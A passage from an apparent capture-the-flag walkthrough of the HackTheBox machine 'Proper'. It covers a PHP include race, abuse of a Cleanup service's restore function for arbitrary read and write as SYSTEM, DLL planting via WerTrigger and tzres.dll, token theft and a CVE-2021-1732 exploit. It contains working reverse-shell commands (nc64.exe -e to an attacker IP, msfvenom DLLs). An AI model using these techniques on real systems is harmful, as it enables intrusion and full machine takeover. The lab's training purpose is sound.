oxdf@parrot$ echo "dummy header" > header.inc; inotifywait -e CLOSE header.inc; sleep 1; echo '<?php echo "it worked!";?>' > header.inc
Setting up watches.
Watches established.
header.inc CLOSE_NOWRITE,CLOSE 

```

It worked!

![image-20210226165626776](https://0xdfimages.gitlab.io/img/image-20210226165626776.png)

### Shell

I’ll turn this into a shell by replacing the PHP code with something to run `nc.exe` from my host:

```

oxdf@parrot$ echo "dummy header" > header.inc; inotifywait -e CLOSE header.inc; sleep 1; echo '<?php system("\\\\10.10.14.10\\share\\nc64.exe -e cmd 10.10.14.10 443");?>' > header.inc
Setting up watches.
Watches established.
header.inc CLOSE_NOWRITE,CLOSE 

```

On refresh, it takes a minute, but I get a shell at `nc`:

```

oxdf@parrot$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 55748
Microsoft Windows [Version 10.0.17763.1728]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\licenses>

```

I can now access `user.txt`:

```

PS C:\users\web\desktop> cat user.txt
01953ac7************************

```

## Shell as root

### Enumeration

I uploaded [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) over SMB to the box and ran it. In the services section, one jumped out as unusual to me:

```

  ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-
...[snip]...
    Cleanup(Iain Patterson - Cleanup)["C:\Program Files\nssm.exe"] - Autoload
    Cleanup service
...[snip]...

```

Most of the others were `.sys` files, or executables that I could find online. It’s also unusual to see an executable sitting in `C:\program files` (usually it’s only folders). `nssm.exe` looks like the [Non-Sucking Service Manager](https://nssm.cc/). I don’t think this is interesting in it’s own right, but it does imply I should be looking at services

There’s also an unfamiliar folder in `Program Files`, `Cleanup`:

```

PS C:\program files>ls

    Directory: C:\program files

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----
d-----       11/15/2020   4:05 AM                Cleanup
d-----       11/14/2020   3:00 AM                Common Files
d-----       11/14/2020   3:25 AM                internet explorer
d-----         1/2/2021   9:13 AM                MariaDB 10.5
d-----       11/14/2020   9:21 AM                Microsoft
d-----       11/14/2020   9:28 AM                PHP
d-----       11/14/2020   9:28 AM                Reference Assemblies
d-----       11/14/2020   9:27 AM                runphp
d-----        1/29/2021  12:41 PM                VMware
d-r---        1/17/2021   7:20 AM                Windows Defender
d-----        1/17/2021   7:20 AM                Windows Defender Advanced Threat Protection
d-----        9/15/2018  12:19 AM                Windows Mail
d-----        1/17/2021   7:20 AM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        1/17/2021   7:20 AM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell
-a----        4/26/2017   7:14 AM         368640 nssm.exe  

```

In that directory are three files:

```

PS C:\program files\cleanup> ls

    Directory: C:\program files\cleanup

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/15/2020   4:03 AM        2999808 client.exe
-a----       11/15/2020   9:22 AM            174 README.md
-a----       11/15/2020   5:20 AM        3041792 server.exe

PS C:\program files\cleanup> cat README.md
# Cleanup

We find the garbage on your system and delete it!

## Changelog
- 31.10.2020 - Alpha Release

## Todo
- Create an awesome GUI
- Check additional paths

```

I don’t have the ability to list services:

```

PS C:\program files\cleanup> net start
System error 5 has occurred.

Access is denied.

PS C:\program files\cleanup>  get-service
get-service : Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:1
+ get-service
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand

```

But I can go into the registry and look for service keys that include `cleanup`:

```

PS C:\program files\cleanup> cd hklm:\system\CurrentControlSet\services\
PS HKLM:\system\CurrentControlSet\services\> ls | findstr /i cleanup
cleanup                        Type                             : 16
                               DisplayName                      : Cleanup
                               Description                      : Cleanup service

```

There’s a service named Cleanup. And it runs the `server.exe`:

```

PS HKLM:\system\CurrentControlSet\services\> ls cleanup

    Hive: HKEY_LOCAL_MACHINE\system\CurrentControlSet\services\cleanup

Name                           Property
----                           --------
Parameters                     Application   : C:\Program Files\Cleanup\server.exe
                               AppParameters :
                               AppDirectory  : C:\Program Files\Cleanup  

```

I’ll grab copies of `client.exe` and `server.exe` to test locally.

### Binary Analysis

#### Running It
**It’s always important to run binaries from CTFs in a VM environment. This binary will delete files in the current user’s Downloads folder. Make sure you have a snapshot before starting**.

Trying to start the client without the server returns:

```

PS > .\client.exe
Cleaning C:\Users\0xdf\Downloads
Error connecting to named pipe cleanupPipe - open \\.\pipe\cleanupPipe: The system cannot find the file specified.

```

The two binaries are using named pipes to communicate (I’ll explore this more in [Beyond Root](#arbitrary-read)). Also, it mentions that it’s trying to clean my `Downloads` folder. Double-clicking on the server pops an empty console windows. Now when I run the client, it looks like the connection eventually times out:

```

PS > .\client.exe
Cleaning C:\Users\0xdf\Downloads
Error connecting to named pipe cleanupPipe - i/o timeout

```

Still, there’s output in the `server.exe` window:

```

CLEAN C:\Users\0xdf\Downloads\7z1900-x64.msi
CLEAN C:\Users\0xdf\Downloads\AutoIt_Debugger_Setup_v0.47.0.exe
CLEAN C:\Users\0xdf\Downloads\Bochs-win64-2.6.11.exe
CLEAN C:\Users\0xdf\Downloads\ExploitCapcom-master.zip
CLEAN C:\Users\0xdf\Downloads\ExplorerSuite.exe
CLEAN C:\Users\0xdf\Downloads\PE.Explorer_setup.exe
CLEAN C:\Users\0xdf\Downloads\Sc445.exe
CLEAN C:\Users\0xdf\Downloads\SciTE4AutoIt3.exe
CLEAN C:\Users\0xdf\Downloads\autoit-v3-setup.exe
CLEAN C:\Users\0xdf\Downloads\desktop.ini
CLEAN C:\Users\0xdf\Downloads\ghidra_9.1.2_PUBLIC_20200212.zip

```

There’s also now files in `C:\programdata\cleanup`:

```

C:\ProgramData\Cleanup> ls
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcN3oxOTAwLXg2NC5tc2k=
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcQXV0b0l0X0RlYnVnZ2VyX1NldHVwX3YwLjQ3LjAuZXhl
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcQm9jaHMtd2luNjQtMi42LjExLmV4ZQ==
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcRXhwbG9pdENhcGNvbS1tYXN0ZXIuemlw
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcRXhwbG9yZXJTdWl0ZS5leGU=
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcU2M0NDUuZXhl
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcU2NpVEU0QXV0b0l0My5leGU=
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcUEUuRXhwbG9yZXJfc2V0dXAuZXhl
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcYXV0b2l0LXYzLXNldHVwLmV4ZQ==
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcZ2hpZHJhXzkuMS4yX1BVQkxJQ18yMDIwMDIxMi56aXA=
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcZGVza3RvcC5pbmk=
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcaGV4aW5hdG9yLTY0LTEuMTIubXNp
QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcamRrLTE1X3dpbmRvd3MteDY0X2Jpbi5leGU=

```

Those all decode to the path to the file that was removed:

```

$ echo "QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcN3oxOTAwLXg2NC5tc2k=" | base64 -d
C:\Users\0xdf\Downloads\7z1900-x64.msi

```

The files are just encrypted blobs of random data.

One interesting thing - all of those files were already in my Downloads folder. When I tried to create a new file in `Downloads` and run `client.exe`, it doesn’t get cleaned up.

#### RE

The binary is written in Go, which makes it super difficult to reverse, for many reasons. One, it brings all it’s dependencies along, so they are in the binary and you’ll want to avoid reversing those. Additionally, there’s all kinds of weirdness with how things are handled. For example, strings are all lumped together into blobs, and not null terminated. Instead, a string object has two parts, a pointer to the string, and a int length.

I’ll use both Ghidra and Ida (free) to take a look at things. The binary isn’t stripped, so it’s possible to find all the functions that start with `main`, which is where Go groups the main code. For example, in `client.exe`, Ghidra shows:

![image-20210301164917343](https://0xdfimages.gitlab.io/img/image-20210301164917343.png)

In `client.exe`, I went looking for the `Cleaning %s` string. It directed me here (Ida):

![image-20210301164426380](https://0xdfimages.gitlab.io/img/image-20210301164426380.png)

It’s marked in red. What’s also interesting is the string `Restoring %s`, which indicates it has some capability to bring back the file it cleaned. That’s likely what I saw in `ProgramData`.

There’s also functions for `serviceClean` and `serviceRestore`.

Neither Ghidra nor Ida gave a great picture of how the binary worked, but I used [x64dbg](https://x64dbg.com/#start) along with them to figure out what was going on. It helps to [disable ASLR](https://oalabs.openanalysis.net/2019/06/12/disable-aslr-for-easier-malware-debugging/) in your reversing VM to easily map between the two.

#### Arguments

At the start of `main.main`, there’s some checking that turns out to be looking at passed in args. It sets two variables based on the results, which I’ve named `cmd_str_len` and `cmd_str`:

![image-20210301201221954](https://0xdfimages.gitlab.io/img/image-20210301201221954.png)

The globals I’ve named `CLEAN` and `RESTORE` are in the middle of the giant ASCII blobs I showed above, and look like this in Ghidra:

![image-20210301201307388](https://0xdfimages.gitlab.io/img/image-20210301201307388.png)

There’s no null to terminate the string, which is why the length is stored in a variable. Similarly, when it goes to look at the second argument passed in, `ARGV+0x18` holds the length of that string, and `ARGV+0x10` holds the pointer to the string itself. This is weird having never reverse Go binaries before.

Still, I can stumble through to realize that if there are 2 or more arguments, and the second arg has length 2 and a value `0x522d`, or `-R`, it will set that `cmd_str` to `RESTORE`, and otherwise to `CLEAN`.

Some guessing around showed that it works if I pass in the original path to the file:

```

C:\Users\0xdf\Desktop>.\client.exe -R C:\Users\0xdf\Downloads\7z1900-x64.msi
Restoring C:\Users\0xdf\Downloads\7z1900-x64.msi

```

The file is back, and the corresponding base64-named file is no longer in `\programdata\cleanup`.

#### Cleanup Criteria

There’s another important thing I learned debugging and jumping around this binary. In the `main.clean` function, it gets the current time with `time.now()`. It then enters a while loop, where it is looping over each file in the directory, eventually calling `os.Stat`. This returns information about the file. It does some conversions, eventually subtracting a time value from `os.Stat` from the value calculated using `time.now()`, and compares it to 0x278d00:

![image-20210301203006885](https://0xdfimages.gitlab.io/img/image-20210301203006885.png)

If the difference is less than 0x278d00, it doesn’t call `main.serviceClean`.

\[0x278d00 = 2592000 = 30 \* 24 \* 60 \* 60 = 30 days\]

So it is only moving files that are more than 30 days old.

### Arbitrary Write

#### Local

The original file is somehow encrypted and stored in `programdata`, with a name that is the base64 of the original name. I wondered what would happen if I changed that name?

I created a dummy file, and set the timestamps back to the start of the year:

```

PS > cat .\Downloads\test.txt
this is a test
PS > $(Get-Item .\Downloads\test.txt).LastWriteTime = $(Get-Date "1/1/2021 6:00 am")
PS > $(Get-Item .\Downloads\test.txt).LastAccessTime = $(Get-Date "1/1/2021 6:00 am")
PS > $(Get-Item .\Downloads\test.txt).CreationTime = $(Get-Date "1/1/2021 6:00 am")
PS > ls .\Downloads\

    Directory: C:\Users\0xdf\Downloads

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          1/1/2021   6:00 AM             14 test.txt

```

I’ll clean it:

```

PS > .\client.exe
Cleaning C:\Users\0xdf\Downloads

```

It shows as cleaned in the server:

```

CLEAN C:\Users\0xdf\Downloads\test.txt

```

And the file is now in `programdata` as `QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdC50eHQ=`:

```

oxdf@parrot$ echo "QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdGZpbGUudHh0" | base64 -d
C:\Users\0xdf\Downloads\testfile.txt

```

I’ll create a new name (the `-n` is important, as the newline will otherwise be in the base64 and mess up the restoration):

```

oxdf@parrot$ echo -n "C:\Users\0xdf\test.txt" | base64
QzpcVXNlcnNcMHhkZlx0ZXN0LnR4dA==

```

And copy the file to that name (in `C:\ProgramData\Cleanup`):

```

PS > copy QzpcVXNlcnNcMHhkZlxEb3dubG9hZHNcdGVzdC50eHQ= QzpcVXNlcnNcMHhkZlx0ZXN0LnR4dA==

```

On restoring, it exists in this new directory:

```

PS > .\client.exe -R C:\Users\0xdf\test.txt
Restoring C:\Users\0xdf\test.txt
PS > cat test.txt
this is a test

```

I’m going to guess that the write occurs as the user running the `server.exe` process. On my machine, that’s just me (I could test by running it as another user on that VM), but on Proper, that’s likely System.

#### Proper

I’ll try the same thing on Proper:

```

PS C:\Users\web\Downloads> cat test.txt
0xdf was here
PS C:\Users\web\Downloads> $(Get-Item test.txt).LastWriteTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\Users\web\Downloads> $(Get-Item test.txt).LastaccessTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\Users\web\Downloads> $(Get-Item test.txt).creationTime = $(Get-Date "1/1/2021 6:00 am")

```

Clean it:

```

PS C:\Users\web\Downloads> cmd /c "C:\program files\cleanup\client.exe"
Cleaning C:\Users\web\Downloads

```

Create a filename:

```

oxdf@parrot$ echo -n "C:\windows\system32\0xdf.txt" | base64
Qzpcd2luZG93c1xzeXN0ZW0zMlwweGRmLnR4dA==

```

Copy the backup into place:

```

PS C:\Users\web\Downloads> copy \programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1x0ZXN0LnR4dA== \programdata\cleanup\Qzpcd2luZG93c1xzeXN0ZW0zMlwweGRmLnR4dA==

```

Restore:

```

PS C:\Users\web\Downloads> cmd /c "C:\program files\cleanup\client.exe" -R C:\windows\system32\0xdf.txt
Restoring C:\windows\system32\0xdf.txt
PS C:\Users\web\Downloads> type C:\windows\system32\0xdf.txt
0xdf was here

```

That looks a lot like arbitrary write as SYSTEM.

### Shell via WerTrigger

#### Write DLL to System32

Converting arbitrary write to shell on Windows is less trivial than on Linux, but still possible. [PayloadsAllTheThings has a section on it](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write). It mentions DiagHub (which I used back in [HackBack](/2019/07/06/htb-hackback.html#arbitrary-write--diaghub--system)) as now patched, UsoDLLLoader (may be patched in some insider builds), and WerTrigger. I was able to get the [WerTrigger POC](https://github.com/sailay1996/WerTrigger) to work.

The way to exploit this is to write the `phoneinfo.dll` binary from the repo into `C:\Windows\System32` and then trigger it’s being run with the error reporting process.

I’ll upload `phoneinfo.dll` to `Downloads` and update the timestamps:

```

PS C:\users\web\downloads> iwr http://10.10.14.10/phoneinfo.dll -outfile phoneinfo.dll
PS C:\users\web\downloads> $(Get-Item phoneinfo.dll).CreationTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\users\web\downloads> $(Get-Item phoneinfo.dll).LastAccessTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\users\web\downloads> $(Get-Item phoneinfo.dll).LastWriteTime = $(Get-Date "1/1/2021 6:00 am")

```

Now run the cleaner:

```

PS C:\Users\web\Downloads> cmd /c "C:\program files\cleanup\client.exe"
Cleaning C:\Users\web\Downloads

```

I’ll need the new filename in `System32`:

```

oxdf@parrot$ echo -n "C:\Windows\System32\phoneinfo.dll" | base64
QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs

```

Use that to make the copy and then restore:

```

PS C:\programdata\cleanup> copy QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xwaG9uZWluZm8uZGxs QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs 
PS C:\programdata\cleanup> cmd /c "C:\program files\cleanup\client.exe" -R C:\Windows\System32\phoneinfo.dll
Restoring C:\Windows\System32\phoneinfo.dll

```

I’ve just written a dll into `System32` that will be used when the windows error reporting program runs.

#### Trigger WER Exploit

The GitHub repo has a binary that triggers the backdoor. The [source](https://github.com/sailay1996/WerTrigger/blob/master/src/WerTrigger/WerTrigger/WerTrigger.cpp) shows it does the following tasks:
- Creates a directory, `c:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e`
- Copies the `REport.wer` to `c:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e\\Report.wer`
- Runs `cmd /c SCHTASKS /RUN /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting"`
- Deletes `c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\a_b_c_d_e`
- Connects to the shell on 127.0.0.1:443.

I can do these steps without the binary.

I’ll make the directory above, and upload the `Report.wer` from GitHub into it:

```

PS C:\programdata> mkdir C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e       
    Directory: C:\programdata\microsoft\windows\wer\reportqueue

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/16/2021  10:38 AM                a_b_c_d_e

PS C:\programdata> iwr http://10.10.14.10/Report.wer -outfile C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e\Report.wer

```

Now I’ll trigger the error reporting task:

```

PS C:\programdata> cmd /c SCHTASKS /RUN /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting"
SUCCESS: Attempted to run the scheduled task "Microsoft\Windows\Windows Error Reporting\QueueReporting".

```

There’s now a shell listening on 1337:

```

PS C:\programdata> netstat -ano | findstr 1337
  TCP    127.0.0.1:1337         0.0.0.0:0              LISTENING       1560

```

I could create a tunnel to it, or just upload `nc` and connect locally. I’ll do the later:

```

PS C:\programdata> .\nc64.exe 127.0.0.1 1337

Microsoft Windows [Version 10.0.17763.1728]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

```

I can now get the flag:

```

C:\Windows\system32> type \users\administrator\desktop\root.txt
30af35b8************************

```

## Beyond Root - Other Roots

### Arbitrary Read

#### Sniff Pipe

I heard that other solved this challenge by converting the cleanup processes into arbitrary read as well as write. To do this, I’ll show a tool called [Pipe Monitor](https://ioninja.com/plugins/pipe-monitor.html) from IONinja. The tool only comes with a free 7-day license, but that’s enough to solve this part.

I’ll install it in my Windows VM, start it, and create a new session. In the window, I’ll select “Pipe Monitor” and make sure to check the “Run as Administrator” box. Then I’ll click OK, and click on the Capture icon on the right to start a capture:

![image-20210316152720464](https://0xdfimages.gitlab.io/img/image-20210316152720464.png)

With the server already started, and a file old enough to be cleaned up in place, I’ll run the `client.exe`. The communications between client and server are exposed. The client is sending the command `CLEAN [path]\n` to the pipe. I’ll restore the file, and it’s also just sent as commands in plaintext into the pipe:

![image-20210316151243797](https://0xdfimages.gitlab.io/img/image-20210316151243797.png)

#### PowerShell Client

`client.exe` only checks in the users `Downloads` directory. But if I write my own client, I can send whatever files I want over the pipe.

I’ll create a handle to the pipe and connect to it:

```

PS C:\> $pipe = New-Object System.IO.Pipes.NamedPipeClientStream("\\.\cleanupPipe")
PS C:\> $pipe.Connect()

```

Now I’ll create a `StreamWriter` object to write into the pipe:

```

PS C:\> $sw = New-Object System.IO.StreamWriter($pipe)
PS C:\> $sw.AutoFlush = $true

```

I’ll clean `root.txt`:

```

PS C:\> $sw.Write("CLEAN C:\users\administrator\desktop\root.txt`n")  

```

It worked:

```

PS C:\> ls \programdata\cleanup

    Directory: C:\programdata\cleanup

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/16/2021  12:37 PM            192 QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0                  

```

That’s `root.txt`. I’ll copy it to `\programdata`:

```

oxdf@parrot$ echo "QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0" | base64 -d
C:\users\administrator\desktop\root.txt
oxdf@parrot$ echo -n "C:\\programdata\\0xdf.txt" | base64
QzpccHJvZ3JhbWRhdGFcMHhkZi50eHQ=
PS C:\> copy \programdata\cleanup\QzpcdXNlcnNcYWRtaW5pc3RyYXRvclxkZXNrdG9wXHJvb3QudHh0 \programdata\cleanup\Qzpwcm9ncmFtZGF0YTB4ZGYudHh0

```

I can restore it the way I did before, and there’s the flag:

```

PS C:\programdata\cleanup> cmd /c "C:\program files\cleanup\client.exe" -R C:\programdata\0xdf.txt                    
Restoring C:\programdata\0xdf.txt

PS C:\programdata\cleanup> type C:\programdata\0xdf.txt
30af35b8************************

```

### Via NetworkService

This is just another way to abuse the arbitrary write. This path takes two hops to get to SYSTEM, first through the network service user.

#### Shell as network service

I need a DLL payload, and AV isn’t causing issues on this box, so I’ll create one with `msfvenom`:

```

oxdf@parrot$ msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST=10.10.14.10 LPORT=443 > rev.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes

```

I’ll upload it to Proper, change the times, clean it to get it into storage:

```

PS C:\Users\web\Downloads> wget 10.10.14.10/rev.dll -outfile rev.dll
PS C:\Users\web\Downloads> $f = "rev.dll"
PS C:\Users\web\Downloads> $(Get-Item $f).creationTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\Users\web\Downloads> $(Get-Item $f).LastaccessTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\Users\web\Downloads> $(Get-Item $f).LastWriteTime = $(Get-Date "1/1/2021 6:00 am")
PS C:\Users\web\Downloads> cmd /c "C:\program files\cleanup\client.exe"
Cleaning C:\Users\web\Downloads
PS C:\Users\web\Downloads> cd \programdata\cleanup
PS C:\programdata\cleanup> dir

    Directory: C:\programdata\cleanup

Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        3/17/2021   1:22 PM          34872 QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xyZXYuZGxs

```

I want to move this file to `system32` as `tzres.dll`:

```

oxdf@parrot$ echo -n "C:\Windows\System32\wbem\tzres.dll" | base64 
QzpcV2luZG93c1xTeXN0ZW0zMlx3YmVtXHR6cmVzLmRsbA==

```

```

PS C:\programdata\cleanup> copy QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xyZXYuZGxs QzpcV2luZG93c1xTeXN0ZW0zMlx3YmVtXHR6cmVzLmRsbA==
PS C:\programdata\cleanup> cmd /c "C:\program files\cleanup\client.exe" -R C:\Windows\System32\wbem\tzres.dll
Restoring C:\Windows\System32\wbem\tzres.dll

```

This DLL is called by the `systeminfo` command, so running that will trigger a reverse shell to me as network service:

```

PS C:\programdata\cleanup> systeminfo
systeminfo
ERROR: The remote procedure call failed.

```

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49680
Microsoft Windows [Version 10.0.17763.1728]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\network service

```

#### Shell as SYSTEM

network service does have `SeImpresonatePrivilege`:

```

C:\ProgramData>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

So I could run [RoguePotato](https://github.com/antonioCoco/RoguePotato) to get a shell from here. There’s also [this post](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html) by Forshaw, which details how to target the RPCSS service process, which also runs as NETWORK SERVICE and almost always has tokens for SYSTEM. The post goes into how to steal them. And Decoder [wrote an executable](https://github.com/decoder-it/NetworkServiceExploit) to just do that automatically.

I’ll download Decoder’s repo into a Windows VM, double click the `.sln` file to open it in Visual Studio, and select build. Once that succeeds, I’ll copy the resulting `.exe` back to my Parrot VM, and upload it to Proper.

Running it prints the syntax:

```

C:\ProgramData>.\NetworkServiceExploit.exe
NetworkServiceExploit.exe:
         -c <command>
         -i interactive mode
         -l list unique tokens
         -p <pid> specific pid to look for

```

Some playing around with it reveals that if I don’t use `-i`, it doesn’t show me output or wait for a return. Once I figured that out, it works:

```

C:\ProgramData>.\NetworkServiceExploit.exe -i -c whoami
[*] Creating Pipe: frAQBc8Wsa1
[*] Listening on pipe \\.\pipe\frAQBc8Wsa1, waiting for client to connect
[*] Client connected!
[*] Enumerating tokens...Done!
[*] Processing tokens, looking for NT AUTHORITY\DECODER... just kidding ;-) looking for:NT AUTHORITY\SYSTEM...
[+] Requested token found!!!
[*] Attempting to create new child process and communicate via anonymous pipe

nt authority\system
[*] Returning from exited process

```

I can just use the `nc64.exe` already on Proper to get a shell:

```

C:\ProgramData>.\NetworkServiceExploit.exe -c "\programdata\nc64.exe -e cmd 10.10.14.10 443" -i
.\NetworkServiceExploit.exe -c "\programdata\nc64.exe -e cmd 10.10.14.10 443" -i
[*] Creating Pipe: frAQBc8Wsa1
[*] Listening on pipe \\.\pipe\frAQBc8Wsa1, waiting for client to connect
[*] Client connected!
[*] Enumerating tokens...Done!
[*] Processing tokens, looking for NT AUTHORITY\DECODER... just kidding ;-) looking for:NT AUTHORITY\SYSTEM...
[+] Requested token found!!!
[*] Attempting to create new child process and communicate via anonymous pipe

```

It hangs there, but at `nc` there’s a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49696
Microsoft Windows [Version 10.0.17763.1728]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\ProgramData>whoami
nt authority\system

```

### CVE-2021-1732

This [really slick POC for CVE-2021-1732](https://github.com/KaLendsi/CVE-2021-1732-Exploit) was published about a week and a half before Proper’s release, and Proper was vulnerable to it at it’s release (though I don’t know of anyone who first solved it this way).

I’ll download the repo to my windows VM, open it in Visual Studio, and build it as is. There are a bunch of warnings, but it succeeds:

![image-20210316155405896](https://0xdfimages.gitlab.io/img/image-20210316155405896.png)

I’ll copy that output exe to my Parrot VM, and then upload it to Proper:

```

PS C:\programdata> iwr http://10.10.14.10/ExploitTest.exe -outfile e.exe

```

The gif on GitHub shows it running as `Exploit.exe whoami`, so I’ll give that a try. It works:

```

PS C:\programdata> .\e.exe whoami                                               
.\e.exe whoami                               
Press any key to continue . . .              

CreateWnd                                    
Hwnd:0015006e   qwfirstEntryDesktop=000001F1FD601AF0
BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
Hwnd:000a005e   qwfirstEntryDesktop=000001F1FD601CB0
BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
Hwnd:000a009a   qwfirstEntryDesktop=000001F1FD601E70
BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
Hwnd:000d0098   qwfirstEntryDesktop=000001F1FD602030
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:0010007a   qwfirstEntryDesktop=000001F1FD6021F0
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:00c9002e   qwfirstEntryDesktop=000001F1FD6023B0
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:000e007c   qwfirstEntryDesktop=000001F1FD602570
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:000a0092   qwfirstEntryDesktop=000001F1FD602730
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:000200a2   qwfirstEntryDesktop=000001F1FD6028F0
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Hwnd:000300a0   qwfirstEntryDesktop=000001F1FD602AB0
BaseAddress:000001F1FD602000   RegionSize=:0000000000002000
Min BaseAddress:000001F1FD601000   RegionSize=:0000000000003000
MagciHwnd==00000000000400A0                  
realMagicHwnd=00000000000400A0               
dwRet=0000000000001E20                       
tagWndMin_offset_0x128=0000000000001E20
g_qwExpLoit=FFFFF634C08223C0                 
qwFrist read=FFFFF634C0834140                
qwSecond read=FFFFD1886DE11810               
qwSecond read=FFFFF634C26D0000               
qwFourth read=FFFFF634C07AF010               
qwFifth read=FFFFD18870D48080                
qwSixth read=FFFFD1886CB71080                
[*] Trying to execute whoami as SYSTEM
[+] ProcessCreated with pid 4020!            
===============================              
nt authority\system                          

Press any key to continue . . .

```

I’ll try a reverse shell with `nc64.exe` that I uploaded earlier:

```

PS C:\programdata> .\e.exe "\programdata\nc64.exe -e powershell 10.10.14.10 443"
Press any key to continue . . . 

```

It hangs, but there’s a shell at another `nc` listener:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.231] 49687
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\programdata> whoami
nt authority\system

```